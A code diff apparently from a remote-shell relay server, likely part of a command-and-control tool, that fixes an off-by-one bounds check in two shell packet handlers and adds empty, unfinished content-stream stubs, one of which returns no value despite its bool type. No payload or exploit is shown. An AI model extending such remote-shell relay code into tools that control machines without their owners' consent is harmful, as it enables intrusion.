@@ -116,7 +116,7 @@ void laikaC_closeShells(struct sLaika_peer *peer) {
     }
 }
 
-/* ============================================[[ Packet Handlers ]]============================================= */
+/* ========================================[[ [Peer] Packet Handlers ]]========================================== */
 
 void laikaC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
     struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
@@ -126,7 +126,7 @@ void laikaC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *u
     laikaS_readInt(&peer->sock, &id, sizeof(uint32_t));
 
     /* ignore packet if shell isn't open */
-    if (id > LAIKA_MAX_SHELLS || (shell = pInfo->shells[id]) == NULL)
+    if (id >= LAIKA_MAX_SHELLS || (shell = pInfo->shells[id]) == NULL)
         return;
 
     /* close shell */
@@ -146,7 +146,7 @@ void laikaC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uD
     laikaS_readInt(&peer->sock, &id, sizeof(uint32_t));
 
     /* ignore packet if shell isn't open */
-    if (id > LAIKA_MAX_SHELLS || (shell = pInfo->shells[id]) == NULL)
+    if (id >= LAIKA_MAX_SHELLS || (shell = pInfo->shells[id]) == NULL)
         return;
 
     laikaS_read(&peer->sock, (void*)buf, sz-sizeof(uint32_t));
@@ -156,4 +156,21 @@ void laikaC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uD
     laikaS_writeInt(&shell->auth->sock, &shell->authShellID, sizeof(uint32_t));
     laikaS_write(&shell->auth->sock, buf, sz-sizeof(uint32_t));
     laikaS_endVarPacket(shell->auth);
+}
+
+/* ============================================[[ Content Handlers ]]============================================ */
+
+/* content stream has finished */
+void laikaC_contentRecvEvent(struct sLaika_peer *peer, struct sLaika_contentContext *context, struct sLaika_content *content) {
+
+}
+
+/* request to open a content stream */
+bool laikaC_contentNewEvent(struct sLaika_peer *peer, struct sLaika_contentContext *context, struct sLaika_content *content) {
+
+}
+
+/* error happened on a stream */
+void laikaC_contentErrEvent(struct sLaika_peer *peer, struct sLaika_contentContext *context, struct sLaika_content *content, CONTENT_ERRCODE err) {
+    
 }
